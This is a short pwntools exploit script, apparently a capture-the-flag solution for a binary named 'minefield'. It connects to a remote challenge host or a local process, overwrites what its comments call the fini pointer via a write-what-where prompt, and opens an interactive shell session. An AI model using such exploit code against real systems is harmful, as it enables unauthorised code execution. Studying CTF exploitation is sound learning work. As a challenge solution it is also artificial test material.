#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./minefield')
context.terminal = ["tilix","-a","session-add-right","-e"]

host = args.HOST or '46.101.37.171'
port = int(args.PORT or 32694)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x400add
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.sendlineafter("> ", "2")
io.sendafter(": ", str(0x6010a8)) # fini pointer
io.sendafter(": ", str(0x40096b)) # fini pointer
io.interactive()